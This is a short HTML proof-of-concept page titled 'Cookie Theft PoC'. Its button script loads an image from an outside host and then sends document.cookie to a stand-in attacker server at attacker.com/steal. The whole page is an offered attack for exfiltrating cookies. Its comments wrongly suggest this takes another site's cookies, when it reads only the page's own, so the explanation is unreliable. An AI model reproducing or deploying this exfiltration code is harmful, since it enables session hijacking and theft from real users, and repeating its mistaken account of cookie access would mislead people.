<!DOCTYPE html>
<html>
<head>
    <title>Cookie Theft PoC</title>
</head>
<body>
    <h1>Cookie Theft PoC</h1>
    <p>Click the button to send a request to example.com and steal cookies.</p>
    <button id="stealCookies">Steal Cookies</button>

    <script>
        document.getElementById('stealCookies').onclick = function() {
            // Create a new image element to trigger a request to example.com
            var img = new Image();
            img.src = "https://airflow.soundcloud.org/"; // Change this to a valid resource on example.com

            // Add an event listener to capture the cookies if the request is successful
            img.onload = function() {
                // Since we cannot directly access the cookies, we can send the request to our server
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://attacker.com/steal?cookies=" + document.cookie, true); // Send the cookies to the attacker's server
                xhr.send();
            };
        };
    </script>
</body>
</html>
